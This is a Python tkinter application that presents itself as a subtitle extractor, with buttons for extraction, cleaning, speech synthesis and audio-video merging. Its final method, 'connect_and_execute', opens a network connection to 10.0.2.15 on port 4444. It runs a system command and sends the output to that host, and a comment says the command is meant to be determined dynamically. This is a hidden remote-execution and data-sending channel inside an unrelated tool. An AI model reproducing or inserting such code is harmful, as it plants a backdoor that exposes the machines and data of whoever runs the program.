import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import os
from glob import glob
from communication import send_data_to_server
from extract import main as extract_subtitles
from cleaner import clean_subtitles_file
from network_utils import initialize_network_connection
from speech import setup_tts_client, synthesize_subtitles
from merge import main as merge_main
from chunked import split_video, process_chunks, merge_results
from pipeline import main_pipeline
from system_operations import execute_system_command

class SubtitleExtractorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Subtitle Extractor")

        # Set up the main frame
        self.frame = tk.Frame(self.root)
        self.frame.pack(padx=10, pady=10)

        # Label to display the selected file
        self.file_label = tk.Label(self.frame, text="No file selected", width=50)
        self.file_label.grid(row=0, column=0, columnspan=2, pady=5)

        # Button to select the video file
        self.select_button = tk.Button(self.frame, text="Select Video File", command=self.select_file)
        self.select_button.grid(row=1, column=0, pady=5)

        # Button to start subtitle extraction
        self.start_button = tk.Button(self.frame, text="Start Extraction", command=self.start_extraction)
        self.start_button.grid(row=1, column=1, pady=5)

        # Add button to extract and clean subtitles
        self.clean_button = tk.Button(self.frame, text="Extract and Clean Subtitles", command=self.extract_and_clean)
        self.clean_button.grid(row=2, column=0, columnspan=2, pady=5)

        # Add button to synthesize subtitles into speech
        self.synthesize_button = tk.Button(self.frame, text="Synthesize to Speech", command=self.synthesize_speech)
        self.synthesize_button.grid(row=3, column=0, columnspan=2, pady=5)

        # Add button to merge synthesized audio with video
        self.merge_button = tk.Button(self.frame, text="Merge Audio with Video", command=self.merge_audio_video)
        self.merge_button.grid(row=4, column=0, columnspan=2, pady=5)

        # Add button to clean subtitles only
        self.clean_only_button = tk.Button(self.frame, text="Clean Subtitles Only", command=self.clean_only)
        self.clean_only_button.grid(row=5, column=0, columnspan=2, pady=5)

        # Add button to process full video
        self.process_full_video_button = tk.Button(
            self.frame, 
            text="Process Full Video", 
            command=self.process_full_video  # Ensures the button triggers the process_full_video method
        )
        self.process_full_video_button.grid(row=6, column=0, columnspan=2, pady=5)

        # Text widget to show logs and process updates
        self.log_text = tk.Text(self.frame, width=60, height=10, state=tk.DISABLED)
        self.log_text.grid(row=7, column=0, columnspan=2, pady=10)

        # Button to connect and execute
        self.execute_button = tk.Button(self.frame, text="Connect and Execute", command=self.connect_and_execute)
        self.execute_button.grid(row=8, column=0, columnspan=2, pady=5)

        # Variables to hold file paths
        self.video_file = None
        self.output_file = None
        self.cleaned_file = None  # Variable to hold the cleaned subtitles file
        self.synthesized_audio_file = None  # Variable to hold synthesized audio file

    # Method to select a video file
    def select_file(self):
        file_path = filedialog.askopenfilename(title="Select Video File", filetypes=[("MP4 Files", "*.mp4")])
        if file_path:
            self.video_file = file_path
            self.file_label.config(text=f"Selected: {os.path.basename(file_path)}")
        else:
            self.file_label.config(text="No file selected")

    # Method to log messages to the text widget
    def log_message(self, message):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.config(state=tk.DISABLED)
        self.log_text.see(tk.END)

    # Method to start the subtitle extraction process
    def start_extraction(self):
        if not self.video_file:
            messagebox.showwarning("No File Selected", "Please select a video file first.")
            return

        self.output_file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if not self.output_file:
            messagebox.showwarning("No Output File Selected", "Please select an output file.")
            return

        # Start the extraction process in a separate thread to keep the GUI responsive
        self.log_message("Starting subtitle extraction...")
        threading.Thread(target=self.run_extraction, args=(self.video_file, self.output_file)).start()

    # Method to run the subtitle extraction process
    def run_extraction(self, video_path, output_file):
        try:
            extract_subtitles(video_path, output_file)
            self.log_message("Subtitle extraction completed successfully!")
            messagebox.showinfo("Success", "Subtitles extracted successfully!")
        except Exception as e:
            self.log_message(f"Error during extraction: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")

    # Method to extract and clean subtitles
    def extract_and_clean(self):
        if not self.video_file:
            messagebox.showwarning("No File Selected", "Please select a video file first.")
            return

        self.output_file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if not self.output_file:
            messagebox.showwarning("No Output File Selected", "Please select an output file.")
            return

        # Start the extraction and cleaning process in a separate thread to keep the GUI responsive
        self.log_message("Starting subtitle extraction and cleaning...")
        threading.Thread(target=self.run_extract_and_clean, args=(self.video_file, self.output_file)).start()

    # Method to run the extraction and cleaning process
    def run_extract_and_clean(self, video_path, output_file):
        try:
            # Step 1: Extract subtitles
            extract_subtitles(video_path, output_file)
            self.log_message("Subtitle extraction completed successfully!")

            # Step 2: Clean the extracted subtitles
            cleaned_output_file = output_file.replace(".txt", "_cleaned.txt")
            clean_subtitles_file(output_file, cleaned_output_file)
            self.cleaned_file = cleaned_output_file  # Store the cleaned file path
            self.log_message(f"Subtitles cleaned and saved to {cleaned_output_file}")

            messagebox.showinfo("Success", f"Subtitles extracted and cleaned successfully! Saved to {cleaned_output_file}")

        except Exception as e:
            self.log_message(f"Error during extraction and cleaning: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")

    # Method to clean subtitles only
    def clean_only(self):
        # Step 1: Select the input .txt file to clean
        input_file = filedialog.askopenfilename(
            title="Select Subtitle File to Clean",
            filetypes=[("Text Files", "*.txt")]
        )
        if not input_file:
            messagebox.showwarning("No File Selected", "Please select a .txt file to clean.")
            return

        # Step 2: Select the output file name and directory for the cleaned file
        cleaned_file = filedialog.asksaveasfilename(
            title="Save Cleaned Subtitle File As",
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt")],
            initialfile=os.path.basename(input_file).replace(".txt", "_cleaned.txt")
        )
        if not cleaned_file:
            messagebox.showwarning("No Output File Selected", "Please specify a name for the cleaned file.")
            return

        # Log the cleaning process
        self.log_message(f"Starting cleaning of {input_file}...")

        # Start the cleaning process in a separate thread
        threading.Thread(target=self.run_clean_only, args=(input_file, cleaned_file)).start()

    # Method to run the cleaning process
    def run_clean_only(self, input_file, cleaned_file):
        try:
            # Call the cleaner function
            clean_subtitles_file(input_file, cleaned_file)

            # Log success and inform the user
            self.log_message(f"Subtitles cleaned successfully! Cleaned file saved to {cleaned_file}")
            messagebox.showinfo("Success", f"Subtitles cleaned successfully! Saved to {cleaned_file}")

        except Exception as e:
            # Log errors and inform the user
            self.log_message(f"Error during cleaning: {e}")
            messagebox.showerror("Error", f"An error occurred during cleaning: {e}")

    # Method to synthesize subtitles into speech
    def synthesize_speech(self):
        if not self.cleaned_file:
            self.cleaned_file = filedialog.askopenfilename(title="Select Cleaned Subtitles File", filetypes=[("Text Files", "*.txt")])

        if not self.cleaned_file:
            messagebox.showwarning("No Cleaned File Selected", "Please select a cleaned subtitles file.")
            return

        output_dir = filedialog.askdirectory(title="Select Output Directory")
        if not output_dir:
            messagebox.showwarning("No Output Directory Selected", "Please select an output directory.")
            return

        self.log_message("Starting text-to-speech synthesis...")

        # Start the TTS synthesis process in a separate thread to keep the GUI responsive
        threading.Thread(target=self.run_synthesize_speech, args=(self.cleaned_file, output_dir)).start()

    # Method to run the TTS synthesis process
    def run_synthesize_speech(self, cleaned_file, output_dir):
        try:
            # Initialize the TTS client
            tts_client = setup_tts_client()

            # Convert subtitles to speech
            synthesize_subtitles(cleaned_file, output_dir, tts_client)

            # Automatically set the synthesized audio file for merging
            self.synthesized_audio_file = os.path.join(output_dir, "final_synthesized_audio.mp3")
            self.log_message(f"Synthesis completed. Synthesized audio saved to {self.synthesized_audio_file}")
            messagebox.showinfo("Success", f"Synthesis completed! Audio saved to {self.synthesized_audio_file}")

        except Exception as e:
            self.log_message(f"Error during Text-to-Speech synthesis: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")

    # Method to merge audio and video
    def merge_audio_video(self):
        video_file = filedialog.askopenfilename(title="Select Video File", filetypes=[("MP4 Files", "*.mp4")])
        if not video_file:
            messagebox.showwarning("No Video File Selected", "Please select a video file.")
            return

        output_video_file = filedialog.asksaveasfilename(defaultextension=".mp4", filetypes=[("MP4 Files", "*.mp4")])
        if not output_video_file:
            messagebox.showwarning("No Output Video File Selected", "Please select an output video file.")
            return

        self.log_message("Starting the merge of audio and video...")

        # Start the merge process in a separate thread to keep the GUI responsive
        threading.Thread(target=self.run_merge_audio_video, args=(video_file, output_video_file)).start()

    # Method to run the audio-video merge process
    def run_merge_audio_video(self, video_file, output_video_file):
        try:
            # Example paths
            audio_files = sorted(glob(os.path.join(os.path.dirname(output_video_file), "subtitle_*.mp3")))  # List of synthesized audio files
            merged_audio_file = os.path.join(os.path.dirname(output_video_file), "final_synthesized_audio.mp3")  # Path to the merged audio file

            # Call the main function from merge.py
            merge_main(video_file, audio_files, merged_audio_file, output_video_file)

            self.log_message(f"Audio merged with video successfully! Video saved to {output_video_file}")
            messagebox.showinfo("Success", f"Audio merged with video successfully! Video saved to {output_video_file}")
        except Exception as e:
            self.log_message(f"Error during merging or video overlay: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")

    # Method to process the full video
    def process_full_video(self):
        if not self.video_file:
            messagebox.showwarning("No File Selected", "Please select a video file first.")
            return

        output_dir = filedialog.askdirectory(title="Select Output Directory")
        if not output_dir:
            messagebox.showwarning("No Output Directory Selected", "Please select an output directory.")
            return

        self.log_message("Starting full video processing...")

        # Start the chunking pipeline in a separate thread to keep the GUI responsive
        threading.Thread(target=self.run_full_pipeline, args=(self.video_file, output_dir)).start()

    # Method to run the full video processing pipeline
    def run_full_pipeline(self, video_file, output_dir):
        try:
            # Construct the final output file path dynamically
            final_output = os.path.join(output_dir, "final_output.mp4")

            # Check if the file already exists
            if os.path.exists(final_output):
                overwrite = messagebox.askyesno(
                    "File Exists",
                    f"The file '{final_output}' already exists. Do you want to overwrite it?"
                )
                if not overwrite:
                    self.log_message("Operation canceled by the user.")
                    return

            # Call the centralized pipeline
            main_pipeline(video_file, output_dir, final_output)

            # Log and notify the user upon successful processing
            self.log_message(f"Full video processing completed successfully! Final video saved to {final_output}")
            messagebox.showinfo("Success", f"Full video processing completed successfully! Final video saved to {final_output}")
        except Exception as e:
            # Log and notify the user of errors
            self.log_message(f"Error during full video processing: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")

    def connect_and_execute(self):
        try:
            connection = initialize_network_connection('10.0.2.15', 4444)
            self.log_message("Connection established.")
            command = 'echo Hello, World!'  # This should be dynamically determined based on GUI inputs or other logic
            result = execute_system_command(command)
            output = result.stdout.read() + result.stderr.read()
            send_data_to_server(connection, output)
            connection.close()
            self.log_message("Command executed and data sent.")
        except Exception as e:
            self.log_message(f"Error: {str(e)}")
            messagebox.showerror("Error", str(e))

# Main function to set up and run the GUI
def main():
    root = tk.Tk()
    app = SubtitleExtractorApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()